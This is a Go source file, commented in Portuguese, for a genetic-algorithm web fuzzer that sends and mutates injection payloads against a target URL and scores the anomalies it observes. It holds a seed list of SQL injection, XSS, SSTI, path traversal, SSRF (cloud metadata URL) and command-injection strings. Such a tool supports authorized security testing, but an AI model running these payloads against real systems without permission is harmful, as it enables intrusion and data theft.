// Package fuzz implementa o Feedback-Guided Fuzzer (Módulo 4).
//
// Em vez de brute-force cego, o fuzzer mantém uma população de payloads e
// muta os melhores ("algoritmo genético simples") com base na anomalia da
// resposta anterior:
//
//	anomaly = status_weight + size_delta + time_delta + body_echo
//
// Sinais de interesse (anomalias):
//   - status diferente do baseline (ex.: 200 -> 500 com payload SQLi)
//   - tamanho do corpo muito diferente (reflexão/echo ou erro verbose)
//   - latência anormal (sleep/time-based)
//   - eco do payload no corpo (XSS/SSTI/reflexão)
//
// O fitness de um payload é a soma ponderada desses sinais. A cada geração,
// os top-N payloads são cruzados/mutados para gerar a próxima população.
// Tudo é registrado na Findings DB (módulo 6) para análise posterior.
package fuzz

import (
	"context"
	"crypto/rand"
	"fmt"
	"io"
	"log"
	"math"
	"net/http"
	"net/url"
	"sort"
	"strings"
	"sync"
	"time"
)

// Payload é um candidato a injeção em um parâmetro.
type Payload struct {
	Value    string        // valor do payload
	Parent   string        // payload pai (crossover)
	Gen      int           // geração
	Fitness  float64       // score de anomalia (maior = mais interessante)
	Status   int           // status da resposta
	Size     int           // tamanho do corpo
	Latency  time.Duration // latência
	Echo     bool          // payload ecoou no corpo?
	Anomaly  []string      // sinais observados
	Requests int           // quantas vezes foi enviado
}

// Config do fuzzer.
type Config struct {
	Target        string   // URL alvo com placeholder {{{FUZZ}}} ou parâmetro a fuzzar
	Param         string   // nome do parâmetro (se target tem query, injeta nela)
	Method        string   // GET | POST
	Data          string   // body para POST (com {{{FUZZ}}} ou param)
	Headers       []string // headers extras "Nome: valor"
	Concurrency   int      // workers (default 8)
	Generations   int      // nº de gerações (default 4)
	Population    int      // população por geração (default 24)
	EliteSize     int      // nº de melhores preservados (default 6)
	BaselineDelay time.Duration // tolerância de latência (default 2s)
	Timeout       time.Duration // timeout por request (default 10s)
	MaxBodySize   int64    // limite de leitura do corpo (default 256KB)
}

// Result consolida a execução.
type Result struct {
	Target   string    `json:"target"`
	Param    string    `json:"param"`
	Generations int    `json:"generations"`
	TotalRequests int  `json:"total_requests"`
	Findings []Payload `json:"findings"` // payloads com fitness acima do limiar
	Best     *Payload  `json:"best"`
}

// seedPayloads: população inicial (payloads clássicos por categoria).
// Sempre com marcador de correlação OOB quando aplicável.
var seedPayloads = []string{
	// SQLi
	"'", "\"", "' OR '1'='1", "' OR 1=1--", "1' AND SLEEP(3)--", "1; SELECT 1--",
	"' UNION SELECT NULL--", "1' OR '1'='1'-- -", "'; DROP TABLE x--",
	// XSS / reflection
	"<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>", "{{7*7}}",
	"${7*7}", "<%= 7*7 %>", "{{constructor.constructor('alert(1)')()}}",
	// SSTI
	"{{7*7}}", "${7*7}", "#{7*7}",
	// Path traversal / LFI
	"../../../../etc/passwd", "....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
	"/etc/passwd", "..\\..\\..\\windows\\win.ini",
	// SSRF
	"http://127.0.0.1", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd",
	// Command injection
	";id", "|id", "`id`", "$(id)", ";& echo INJECTED", "|& echo INJECTED",
	// NoSQL
	"{\"$gt\":\"\"}", "{\"$ne\":null}", "admin'||'1'=='1",
	// Prototype pollution (object merge via query)
	"__proto__[polluted]=x", "constructor[prototype][polluted]=x",
}

// Fuzzer executa as gerações.
type Fuzzer struct {
	cfg  Config
	seed []string
	log  *log.Logger
}

// New cria um Fuzzer.
func New(cfg Config) *Fuzzer {
	if cfg.Concurrency <= 0 {
		cfg.Concurrency = 8
	}
	if cfg.Generations <= 0 {
		cfg.Generations = 4
	}
	if cfg.Population <= 0 {
		cfg.Population = 24
	}
	if cfg.EliteSize <= 0 {
		cfg.EliteSize = 6
	}
	if cfg.BaselineDelay <= 0 {
		cfg.BaselineDelay = 2 * time.Second
	}
	if cfg.Timeout <= 0 {
		cfg.Timeout = 10 * time.Second
	}
	if cfg.MaxBodySize <= 0 {
		cfg.MaxBodySize = 256 << 10
	}
	if cfg.Method == "" {
		cfg.Method = "GET"
	}
	return &Fuzzer{cfg: cfg, seed: seedPayloads, log: log.Default()}
}

// Run executa o fuzzing completo e retorna o Result.
func (f *Fuzzer) Run(ctx context.Context) (*Result, error) {
	res := &Result{Target: f.cfg.Target, Param: f.cfg.Param}
	var mu sync.Mutex

	// Baseline: 3 requests normais para medir tamanho/latência típicos.
	baselineSize, baselineLat, err := f.baseline(ctx)
	if err != nil {
		return nil, fmt.Errorf("baseline: %w", err)
	}
	f.log.Printf("[fuzz] baseline: size=%d lat=%v", baselineSize, baselineLat)

	population := append([]string{}, f.seed...)
	seen := map[string]bool{}
	var allFindings []Payload

	for gen := 0; gen < f.cfg.Generations; gen++ {
		f.log.Printf("[fuzz] geração %d: população=%d", gen, len(population))
		results := f.evaluate(ctx, population, baselineSize, baselineLat, &mu)
		mu.Lock()
		res.TotalRequests += len(results)
		for _, r := range results {
			if r.Fitness >= 1.0 {
				allFindings = append(allFindings, r)
			}
		}
		mu.Unlock()

		// Evolui: elites + crossover + mutação.
		if gen < f.cfg.Generations-1 {
			population = f.evolve(results, seen)
		}
	}

	sort.Slice(allFindings, func(i, j int) bool {
		return allFindings[i].Fitness > allFindings[j].Fitness
	})
	if len(allFindings) > 0 {
		b := allFindings[0]
		res.Best = &b
	}
	res.Findings = allFindings
	res.Generations = f.cfg.Generations
	return res, nil
}

// baseline mede o comportamento normal do alvo.
func (f *Fuzzer) baseline(ctx context.Context) (int, time.Duration, error) {
	var sizes []int
	var lats []time.Duration
	for i := 0; i < 3; i++ {
		start := time.Now()
		resp, size, err := f.send(ctx, "", 0)
		if err != nil {
			return 0, 0, err
		}
		_ = resp
		lats = append(lats, time.Since(start))
		sizes = append(sizes, size)
	}
	// mediana
	sort.Ints(sizes)
	sort.Slice(lats, func(i, j int) bool { return lats[i] < lats[j] })
	return sizes[len(sizes)/2], lats[len(lats)/2], nil
}

// evaluate envia a população com worker pool e calcula fitness.
func (f *Fuzzer) evaluate(ctx context.Context, population []string, baseSize int, baseLat time.Duration, mu *sync.Mutex) []Payload {
	jobs := make(chan string)
	var wg sync.WaitGroup
	var out []Payload
	var outMu sync.Mutex

	for w := 0; w < f.cfg.Concurrency; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for val := range jobs {
				if ctx.Err() != nil {
					return
				}
				start := time.Now()
				resp, size, err := f.send(ctx, val, len(val))
				lat := time.Since(start)
				if err != nil {
					f.log.Printf("[fuzz] err %q: %v", val, err)
					continue
				}
				p := f.score(val, resp, size, lat, baseSize, baseLat)
				outMu.Lock()
				out = append(out, p)
				outMu.Unlock()
			}
		}()
	}
	for _, v := range population {
		jobs <- v
	}
	close(jobs)
	wg.Wait()
	return out
}

// score calcula o fitness de um payload.
func (f *Fuzzer) score(val string, resp *http.Response, size int, lat time.Duration, baseSize int, baseLat time.Duration) Payload {
	p := Payload{Value: val, Status: resp.StatusCode, Size: size, Latency: lat, Requests: 1}

	// 1) Status anômalo (500/400 com payload = erro interpretado pelo servidor)
	statusScore := 0.0
	switch {
	case resp.StatusCode == 500 || resp.StatusCode == 502 || resp.StatusCode == 503:
		statusScore = 3.0
		p.Anomaly = append(p.Anomaly, "status_5xx")
	case resp.StatusCode == 400 && (strings.Contains(val, "'") || strings.Contains(val, "\"")):
		statusScore = 2.0
		p.Anomaly = append(p.Anomaly, "status_400_sqli")
	case resp.StatusCode == 302 && (strings.Contains(val, "http") || strings.Contains(val, "redirect")):
		statusScore = 2.0
		p.Anomaly = append(p.Anomaly, "redirect")
	}

	// 2) Diferença de tamanho (echo/erro verbose)
	if baseSize > 0 {
		delta := math.Abs(float64(size-baseSize)) / float64(baseSize)
		if delta > 0.5 {
			statusScore += math.Min(delta*2, 3.0)
			p.Anomaly = append(p.Anomaly, fmt.Sprintf("size_delta_%.0f%%", delta*100))
		}
	}

	// 3) Latência anômala (time-based)
	if baseLat > 0 && lat > baseLat*3 && lat > f.cfg.BaselineDelay {
		statusScore += 4.0
		p.Anomaly = append(p.Anomaly, fmt.Sprintf("time_anomaly_%s", lat.Round(100*time.Millisecond)))
	}

	// 4) Echo do payload no corpo
	if resp.Body != nil {
		body, _ := io.ReadAll(io.LimitReader(resp.Body, f.cfg.MaxBodySize))
		resp.Body.Close()
		short := val
		if len(short) > 24 {
			short = short[:24]
		}
		if len(body) > 0 && strings.Contains(string(body), short) && len(short) > 3 {
			statusScore += 5.0
			p.Echo = true
			p.Anomaly = append(p.Anomaly, "echo")
		}
	}

	p.Fitness = statusScore
	return p
}

// evolve aplica seleção + crossover + mutação.
func (f *Fuzzer) evolve(results []Payload, seen map[string]bool) []string {
	// Elites: top fitness
	sort.Slice(results, func(i, j int) bool { return results[i].Fitness > results[j].Fitness })
	elite := results
	if len(elite) > f.cfg.EliteSize {
		elite = elite[:f.cfg.EliteSize]
	}

	next := make([]string, 0, f.cfg.Population)
	// Preserva elites
	for _, e := range elite {
		if e.Fitness > 0 && !seen[e.Value] {
			next = append(next, e.Value)
			seen[e.Value] = true
		}
	}

	// Crossover entre elites + mutação aleatória
	rng := make([]byte, 8)
	rand.Read(rng)
	for len(next) < f.cfg.Population {
		if len(elite) < 2 {
			next = append(next, seedPayloads[len(next)%len(seedPayloads)])
			continue
		}
		a := elite[len(next)%len(elite)].Value
		b := elite[(len(next)+1)%len(elite)].Value
		child := mutate(crossover(a, b))
		if !seen[child] {
			next = append(next, child)
			seen[child] = true
		}
	}
	return next
}

// crossover mistura dois payloads (prefixo de um + sufixo do outro).
func crossover(a, b string) string {
	mid := len(a) / 2
	if mid >= len(b) {
		mid = len(b) / 2
	}
	if mid == 0 {
		return a + b
	}
	return a[:mid] + b[mid:]
}

// mutate aplica uma transformação leve (wrap em comentário, duplicação, case).
func mutate(s string) string {
	rng := make([]byte, 4)
	rand.Read(rng)
	switch rng[0] % 4 {
	case 0:
		return s + " -- "
	case 1:
		return "'" + s
	case 2:
		return strings.ToUpper(s[:1]) + s[1:]
	default:
		return s
	}
}

// send monta e envia o request, retornando status, tamanho e erro.
func (f *Fuzzer) send(ctx context.Context, payload string, _ int) (*http.Response, int, error) {
	target := strings.ReplaceAll(f.cfg.Target, "{{{FUZZ}}}", url.QueryEscape(payload))
	if f.cfg.Param != "" && strings.Contains(target, "{{{FUZZ}}}") == false {
		// injeta no parâmetro existente ou adiciona
		u, err := url.Parse(target)
		if err != nil {
			return nil, 0, err
		}
		q := u.Query()
		q.Set(f.cfg.Param, payload)
		u.RawQuery = q.Encode()
		target = u.String()
	}

	req, err := http.NewRequestWithContext(ctx, f.cfg.Method, target, nil)
	if err != nil {
		return nil, 0, err
	}
	for _, h := range f.cfg.Headers {
		if parts := strings.SplitN(h, ":", 2); len(parts) == 2 {
			req.Header.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
		}
	}
	if f.cfg.Method == "POST" && f.cfg.Data != "" {
		body := strings.ReplaceAll(f.cfg.Data, "{{{FUZZ}}}", payload)
		req.Body = io.NopCloser(strings.NewReader(body))
		req.ContentLength = int64(len(body))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}

	client := &http.Client{
		Timeout: f.cfg.Timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // não segue redirects (analisamos o 3xx)
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, 0, err
	}
	// Lê o corpo para medir tamanho (fecha em score() também, mas aqui lemos o header)
	size := int(resp.ContentLength)
	if size < 0 {
		buf := make([]byte, f.cfg.MaxBodySize)
		n, _ := io.ReadFull(resp.Body, buf)
		size = n
		resp.Body = io.NopCloser(io.MultiReader(strings.NewReader(string(buf[:n])), resp.Body))
	}
	return resp, size, nil
}
